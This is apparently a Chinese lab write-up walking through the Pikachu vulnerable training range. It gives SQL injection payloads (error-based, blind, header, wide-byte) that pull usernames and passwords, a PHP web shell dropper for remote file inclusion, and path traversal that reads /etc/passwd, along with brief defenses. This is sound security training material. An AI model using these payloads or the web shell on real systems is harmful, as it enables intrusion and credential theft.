+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">&#x27;select * from users，email,id from member where username like &#x27;</span>%$name%<span class="string">&#x27;&#x27;</span>; </span><br></pre></td></tr></table></figure>
+
+<p>下面构造闭合：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>%<span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>
+
+<p>成功遍历，接下来注入语句与上相同</p>
+<p><img src="https://i.loli.net/2021/01/15/Dgch4NrTp6Y8z1I.png"></p>
+</li>
+<li><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>输入1’ or 1=1#进行测试</p>
+<p><img src="https://i.loli.net/2021/01/15/3QiadL7tDlNI5vJ.png"></p>
+<p>根据判断，猜测php语句应为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">&quot;select * from users where username = (&#x27;<span class="subst">$name</span>&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造闭合：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;) or 1=1#</span></span><br></pre></td></tr></table></figure>
+
+<p>成功遍历。</p>
+<p>接下来注入语句与以上相同。</p>
+<p><img src="https://i.loli.net/2021/01/15/HXDNRrGao3M72Pf.png"></p>
+</li>
+<li><h2 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h2><p>基于函数报错的信息获取需要掌握三个函数<strong>updatexml()</strong>,<strong>extractvalue()</strong>,**floor()**。</p>
+<h3 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml 函数"></a>updatexml 函数</h3><blockquote>
+<p> <strong>updatexml()</strong> <strong>:</strong></p>
+<p>​    Mysql对xml文档数据进行查询和修改的XPATH函数</p>
+<p>​    语法：</p>
+<p>​            Updatexml(xml_document,XPathstring,new_value)</p>
+<p>​    参数说明：</p>
+<p>​            第一个参数：fiedname时string格式，为表中字段名</p>
+<p>​            第二个参数：XPathstring（XPath格式的字符串）</p>
+<p>​            第三个参数：new_value,string格式，替换查找到的符                                合条件的</p>
+<p>​            <strong>XPath定位必须是有效的，否则会发生错误</strong></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## payload构造（以字符型注入（get）为例）：</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,database()),0)#</span></span><br><span class="line"><span class="string">#报错只能显示一行</span></span><br><span class="line"><span class="string">#使用limit依次获取表名（或者使用group_concat函数）</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment">#获取到表名后再依次获取列名</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;</span>pikachu<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1)),0)#</span></span><br><span class="line"><span class="string">#获取到列名后再获取数据</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select username <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment">######</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select password from users where username = &#x27;</span>admin<span class="string">&#x27; limit 0,1)),0)#</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>基于insert下报错</p>
+</blockquote>
+<p>点击注册按钮，在表单用户处输入单引号，其他随便输入提交引发数据库报错。</p>
+<p>于是猜测php语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert = <span class="string">&quot;insert into member(username,password,sex,phone,addr,address) value(&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,&#x27;<span class="subst">$sex</span>&#x27;,&#x27;<span class="subst">$phone</span>&#x27;,&#x27;<span class="subst">$addr</span>&#x27;,&#x27;<span class="subst">$address</span>&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span></span><br><span class="line"><span class="comment">##此处可在pikachu docker部署的镜像中回显，但是接下来的爆库无法正常回显，应该是php版本过高，接下来在本地进行复现（php5.4.3）</span></span><br></pre></td></tr></table></figure>
+
+<p>爆表：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or (select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),0x7e)) or&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/16/cfVhqF5xjr7zXbl.png"></p>
+<p>爆列：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or (select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;)),0x7e)) or&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/16/6Ls5YfkpgmEqjZc.png"></p>
+<p>爆段：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or (select updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users)),0x7e)) or&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/16/vj2nfCJdEMe9Ir1.png"></p>
+<blockquote>
+<p>基于update报错</p>
+</blockquote>
+<p>使用注册的账号登陆后，点击修改个人信息。</p>
+<p>update报错与insert报错方式相同</p>
+<p>payload构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span></span><br><span class="line"><span class="comment">##此处可在pikachu docker部署的镜像中回显，但是接下来的爆库无法正常回显，应该是php版本过高，接下来在本地进行复现（php5.4.3）</span></span><br><span class="line"> <span class="comment">##下面步骤与上相同</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h3><blockquote>
+<p><strong>extractvalue()</strong> <strong>:</strong></p>
+<p>​    Mysql对xml文档数据进行查询和修改的XPATH函数</p>
+<p>语法：</p>
+<p>​    Extractvalue(xml_document,xpath_string)</p>
+<p>参数：</p>
+<p>​    第一个参数：XML_document是String,为XML文档对象的名称。</p>
+<p>​    第二个参数：XPath_string(XPath格式的字符串)</p>
+</blockquote>
+</li>
+</ul>
+<p>  以字符型注入（get）为例：</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##payload 构造</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(0,concat(0x7e,database()))#</span></span><br><span class="line"><span class="string">##替换database(),以下步骤相同</span></span><br></pre></td></tr></table></figure>
+
+<p>  <img src="https://i.loli.net/2021/01/16/bCZYUnHNWiJM9LP.png"></p>
+<h3 id="floor函数"><a href="#floor函数" class="headerlink" title="floor函数"></a>floor函数</h3><blockquote>
+<p><strong>floor()</strong> <strong>:</strong></p>
+<p>​    Mysql中用来取整的函数</p>
+</blockquote>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##payload构造</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span><br><span class="line"><span class="string">##替换version()以下步骤相同</span></span><br></pre></td></tr></table></figure>
+
+<p>  <img src="https://i.loli.net/2021/01/16/MlgGjTD8eOzWRb6.png"></p>
+<p>  <strong><em>技巧思路</em></strong></p>
+<p>  ​    在Mysql中使用一些指定的函数来制造报错，从而从报错信息中获取设定的信息。<strong>select/insert/update/delete</strong>都可以使用报错来获取信息。</p>
+<p>  <strong><em>背景条件</em></strong></p>
+<p>  ​    后台没有屏蔽数据库报错信息，在语法发生报错时会输出在前端。</p>
+<ul>
+<li><h2 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h2></li>
+</ul>
+<p>点击留言删除，通过抓包发现，id被传入Url中。</p>
+<p>构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()),<span class="number">0</span>)</span><br><span class="line"><span class="comment">##这里需要对payload进行url编码，将空格转换为+号</span></span><br><span class="line"><span class="comment">##此处可在docker部署的环境进行</span></span><br><span class="line"><span class="comment">##因为这里是id，字符型，所以不需要单引号</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/16/PfKOmZbCxVRvi1u.png"></p>
+<p><img src="https://i.loli.net/2021/01/16/gBkoHsR3X6aGPJ8.png"></p>
+<p>接下来的步骤相同！</p>
+<ul>
+<li><h2 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h2><p>​    验证客户端头信息（如cookie）或者通过http header头信息获取客户的一些信息，如useragent，accept等。</p>
+<p>​    当对客户端http header信息进行获取并使用SQL进行处理，若未做好足够安全措施，将会造成Sql 注入。</p>
+</li>
+</ul>
+<p>这里首先根据提示，登陆后看到了看到了自己的登陆信息</p>
+<p><img src="https://i.loli.net/2021/01/16/zgBUbNXVp1KLcCD.png"></p>
+<p>打开BP，查看HTTP history 找到回显包</p>
+<p><img src="https://i.loli.net/2021/01/16/nBt8cJNdrLiXDIf.png"></p>
+<p>发送到repeater模块进行重放。</p>
+<p>这里进行测试，在user-agent,accept,cookie头里加入单引号均会引发数据库报错。</p>
+<p><strong>User-agent</strong></p>
+<p><img src="https://i.loli.net/2021/01/16/z2x4kENIPZqM9o6.png"></p>
+<p>发现注入点。</p>
+<p>Payload构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,database()),0) or&#x27;</span></span><br><span class="line"><span class="comment">##替换database()，操作一致与上</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Accept</strong></p>
+<p><img src="https://i.loli.net/2021/01/16/EZVCN2A3T1oSuiW.png"></p>
+<p>发现注入点，payload构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,version()),0) or&#x27;</span></span><br><span class="line"><span class="comment">##替换version()，操作一致与上    </span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Cookie</strong></p>
+<p><img src="https://i.loli.net/2021/01/16/1GHdpTlI4enZUua.png"></p>
+<p>payload构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and updatexml(1,concat(0x7e,version()),0)#</span></span><br><span class="line"><span class="string">##替换version()，操作一致与上</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><h2 id="盲注（base-on-boolean）"><a href="#盲注（base-on-boolean）" class="headerlink" title="盲注（base on boolean）"></a>盲注（base on boolean）</h2><p>​    在一些情况下，后台使用了错误的信息屏蔽方法，（比如在php语句前加入@）屏蔽了报错，此时无法再根据报错信息来进行注入判断。这种情况称为盲注！</p>
+<p>​    盲注又分为based boolean(基于布尔盲注) 和 based time（基于时间盲注）</p>
+<p>基于布尔类型的注入：</p>
+<p>​    注入点回显只有真与假两种显示，无法直接爆出数据库信息。</p>
+<p>在查询框输入正确用户名会显示用户的信息，如下</p>
+<p><img src="https://i.loli.net/2021/01/16/4dYZTrsHUlPi3fw.png"></p>
+<p>当无论输入除正确的用户名外都只会显示错误提示，如下</p>
+<p><img src="https://i.loli.net/2021/01/16/P1oLpivYZgQaBfn.png"></p>
+</li>
+</ul>
+<p>​    <strong><em>这里需要用到三个函数 ：</em></strong></p>
+<p><img src="https://i.loli.net/2021/01/16/EDCAtKJyvgPOe71.png"></p>
+<p>​        <strong>length()</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>()); <span class="comment">--显示对象的长度</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/16/jqTcZGaH1JlwRm3.png"></p>
+<p><strong>substr()</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>); <span class="comment">--从对象第一位开始显示，显示一个</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">1</span>); <span class="comment">--从对象第二位开始显示，显示一个</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/16/SF3fiEhLCIUrg5G.png"></p>
+<p><strong>ascii()</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)); <span class="comment">--将显示的字符转换为ascii码</span></span><br><span class="line"><span class="comment">-- p 对应的ascii码为112</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>));</span><br><span class="line"><span class="comment">-- i 对应的ASCII码为105</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/16/IblJuSAH418WxDM.png"></p>
+<p>下面利用这三个函数来进行注入。</p>
+<p>由于注入点只显示真与假两种结果，那么使用对比的方式进行注入。</p>
+<p>并使用二分法依次推出正确结果。</p>
+<p><strong>判断数据库长度</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##随意猜测一个数字进行比较，后采用二分法推出正确结果</span></span><br><span class="line">kobe&#x27; and (<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>())&gt;<span class="number">10</span>)<span class="comment">#</span></span><br><span class="line">kobe<span class="string">&#x27; and (select lebgth(database())&gt;5)#</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>())&gt;<span class="number">8</span>)<span class="comment">#</span></span><br><span class="line">kobe<span class="string">&#x27; and (select length(database())&gt;6)#</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>())&gt;<span class="number">7</span>)<span class="comment">#</span></span><br><span class="line">kobe<span class="string">&#x27; and (select length(database())=7)#</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>据此二分法推出数据库的长度为 <strong>7</strong></p>
+<p><strong>推出数据库名称</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##流程与上一致</span></span><br><span class="line">kobe&#x27; and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">100</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment">-----------------------使用二分法---------------------</span></span><br><span class="line">kobe<span class="string">&#x27; and (select ascii(substr(database(),1,1))=112)#</span></span><br></pre></td></tr></table></figure>
+
+<p>依次推出数据库的ASCII码后使用ASCII码表进行对比，得出数据库pikachu。</p>
+<p><strong>推出表名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##流程一致，二分法依次推出</span></span><br><span class="line">kobe&#x27; and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;pikachu&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">104</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>依次推出表名httpinfo,member,message,users,xssblind。</p>
+<p><strong>推出列名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##流程一致，二分法依次推出</span></span><br><span class="line">kobe&#x27; and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">&#x27;pikachu&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>依次推出列名id,username,password,level。</p>
+<p><strong>推出段名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##流程一致，二分法依次推出</span></span><br><span class="line"><span class="comment">##获取用户名username</span></span><br><span class="line">kobe&#x27; and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">97</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment">##获取密码password</span></span><br><span class="line">kobe<span class="string">&#x27; and (select ascii(substr((select password from users limit 0,1),1,1))=101)#</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h2 id="盲注（base-on-time）"><a href="#盲注（base-on-time）" class="headerlink" title="盲注（base on time）"></a>盲注（base on time）</h2><p>基于boolean的盲注在页面上还可以看到真与假的回显，那么基于时间的盲注就什么也看不到。</p>
+<p>但是还有一个条件就是 ‘ 时间 ‘ ，通过特定的输入，判断后台执行的时间，从而确认注入 。</p>
+<p>常用的payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&#x27; and sleep(5)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p> 回到pikachu靶场中，无论输入什么都只有一个回显！</p>
+<p><img src="https://i.loli.net/2021/01/17/dkReq31Y8BUa5rK.png"></p>
+<p>打开开发者工具，进行测试。</p>
+<p>正常输入查看返回时间。</p>
+<p><img src="https://i.loli.net/2021/01/17/ozjktyIfYlH6Ahg.png"></p>
+<p>耗时150ms</p>
+<p>下面输入payload测试</p>
+<blockquote>
+<p>kobe’ and sleep(5)#</p>
+</blockquote>
+</li>
+</ul>
+<p>  <img src="https://i.loli.net/2021/01/17/qE2fmNnvOgiHIaK.png"></p>
+<p>  耗时5.25s，可以判定存在延时注入。</p>
+<p>  构造payload进行注入：</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and if ((substr(database(),1,1))=&#x27;p&#x27;,sleep(5),null)<span class="comment">#</span></span><br><span class="line"><span class="comment">-- 使用了一个if判断，若真则延时5s</span></span><br><span class="line"><span class="comment">-- 替换database()，流程一致与上</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的 ‘ \ ‘ 也就是％5c中变成了一个汉字“运”，而“逃逸了出来。</p>
+</li>
+</ul>
+<p>  payload:</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df\&#x27; or 1=1<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><h2 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h2><p>1、代码层面</p>
+<blockquote>
+<p>a、对输入进行严格的转义和过滤。</p>
+<p>b、使用预处理和参数化（parameterized)</p>
+</blockquote>
+<p>2、网路层面</p>
+<blockquote>
+<p>a、同WAF设备启用防SQL注入策略</p>
+<p> b、购买云端防护（360网站卫士，阿里云盾等</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li><h2 id="RCE-远程命令执行"><a href="#RCE-远程命令执行" class="headerlink" title="RCE(远程命令执行)"></a>RCE(远程命令执行)</h2><p>​    RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
+<p>​    一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。</p>
+</li>
+</ul>
+<h3 id="Exec-‘-evel-‘"><a href="#Exec-‘-evel-‘" class="headerlink" title="Exec  ‘ evel ‘"></a>Exec  ‘ evel ‘</h3><p>​        在输入框内输入phpinfo();执行系统命令。</p>
+<p><img src="https://i.loli.net/2021/01/18/sBpS8zlUxWXTtjO.png"></p>
+<h2 id="File-Include-文件包含漏洞"><a href="#File-Include-文件包含漏洞" class="headerlink" title="File Include(文件包含漏洞)"></a>File Include(文件包含漏洞)</h2><p>​    文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：include(),include_once()，require(),require_once()。</p>
+<p>​    大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：</p>
+<p><strong>1.本地文件包含漏洞：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</p>
+<p><strong>2.远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码。</p>
+<p>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p>
+<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>在测试中可以看到url当中是将前端文件名传到后端从而读取文件。</p>
+<p><img src="https://i.loli.net/2021/01/18/LXB36rnCfYH2TcG.png"></p>
+<p>那么可以尝试进行构造payload读取指定文件。这里的环境是运行在linux，所以尝试读取配置文件夹下的passwd文件。</p>
+<p><img src="https://i.loli.net/2021/01/18/Iy9C3Sd1ZOWzkBw.png"></p>
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>远程文件包含漏洞形式跟本地文件包含漏洞差不多，在远程包含漏洞中，攻击者可以通过访问外部地址来加载远程代码。</p>
+<p>远程包含漏洞的前提：如果使用的include和require，则需要php.ini配置如下（php5.4.34)</p>
+<p>allow_url_fopen = on //默认打开</p>
+<p>Allow_url_include = on //默认关闭</p>
+<p>从恶意站点所下载的一句话马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = fopen(<span class="string">&quot;muma.php&quot;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">	$txt = <span class="string">&#x27;&lt;?php system($_GET[&#x27;</span>cmd<span class="string">&#x27;]);?&gt;&#x27;</span>;</span><br><span class="line">	$write = ($file,$txt);</span><br><span class="line">	$fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=恶意站点文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
+<p>思路：</p>
+<p>​    1、制作一个图片马，通过文件上传漏洞上传</p>
+<p>​    2、通过文件包含漏洞对该图片马进行 ’ 包含 ‘</p>
+<p>​    3、获取执行结果</p>
+</blockquote>
+<h3 id="常见防范措施"><a href="#常见防范措施" class="headerlink" title="常见防范措施"></a>常见防范措施</h3><blockquote>
+<p>1、在功能设计上尽量不要将文件包含函数对应的文件放在前端进行选择和操作。</p>
+<p>2、过滤各种../../,”http://“,”https://“</p>
+<p>3、配置php.ini配置文件</p>
+<p>​    allow_url_fopen = off</p>
+<p>​    allow_url_include = off</p>
+<p>​    magic_quotes_gpc = on</p>
+<p>4、通过白名单策略，仅允许半酣运行指定的文件，其余均禁止。</p>
+</blockquote>
+<p>​        </p>
+<h2 id="不安全的文件下载与上传"><a href="#不安全的文件下载与上传" class="headerlink" title="不安全的文件下载与上传"></a>不安全的文件下载与上传</h2><p>许多网站都会提供文件下载功能。但是如果下载功能设计不当，则可能导致攻击者可以通过构造文件路径，从而获取到服务器上的其他的敏感文件。（任意文件下载）</p>
+<p>点击下载图片，看似没有什么问题。抓包进行分析。</p>
+<p><img src="https://i.loli.net/2021/01/18/EQjtde2KOV7YMuP.png"></p>
+<p>发现是前端向后端请求下载文件，那么构造特殊payload查看是否能实现任意文件下载。</p>
+<p><img src="https://i.loli.net/2021/01/18/mKlVod2sHYMbzr8.png"></p>
+<p>下载配置文件下的passwd文件。</p>
+<p><img src="https://i.loli.net/2021/01/18/na6uJUfG8kV2eyq.png"></p>
